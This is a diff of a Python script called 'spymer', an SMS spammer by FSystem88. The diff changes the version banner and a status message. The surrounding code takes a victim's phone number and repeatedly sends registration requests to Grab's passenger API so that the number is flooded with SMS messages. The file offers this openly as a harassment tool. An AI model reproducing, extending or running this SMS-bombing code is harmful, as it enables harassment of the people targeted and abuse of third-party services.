@@ -1,9 +1,8 @@
-
 class spymer:
 	author = ''
 
 	def main(self):
-		print '8888888888888888888888888\n8888888888888888888888888\n888        888        888\n888  888888888  8888  888\n888  888888888  888888888\n888  888888888  888888888\n888        888        888\n888  888888888888888  888\n888  888888888888888  888\n888  888888888  8888  888\n888  888888888        888\n8888888888888888888888888\n8888888888888888888888888\n8888    FSystem88    8888\n8888   SMS Spammer   8888\n8888      v.1.5      8888\n8888888888888888888888888\n8888888888888888888888888\n'
+		print '8888888888888888888888888\n8888888888888888888888888\n888        888        888\n888  888888888  8888  888\n888  888888888  888888888\n888  888888888  888888888\n888        888        888\n888  888888888888888  888\n888  888888888888888  888\n888  888888888  8888  888\n888  888888888        888\n8888888888888888888888888\n8888888888888888888888888\n8888    FSystem88    8888\n8888   SMS Spammer   8888\n8888      v.2.1      8888\n8888888888888888888888888\n8888888888888888888888888\n'
 		import requests, datetime, sys, time, argparse
 		parser = argparse.ArgumentParser(prog='spymer', description="Fucking shit by Fsystem88. May be not work. Only for Russia!", epilog='My contacts: +79153509908 (Russia) or e-mail - FSystem88@bk.ru')
 		parser.add_argument('phonenum', metavar='phone', help='the phone number (example: 79153509908)')
@@ -38,7 +37,7 @@ class spymer:
 		iteration = 0
 		_phone9 = _phone[1:]
 		print showstatus(wrapsbrace('info', True) + ('Send SMS to: +{}').format(_phone))
-		print 'Spammer started.\n If you want to stop - press Ctrl+Z.'
+		print 'Spammer started.\nIf you want to stop - press Ctrl+Z.'
 		i = 1
 		while i < 10:
 			grab = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
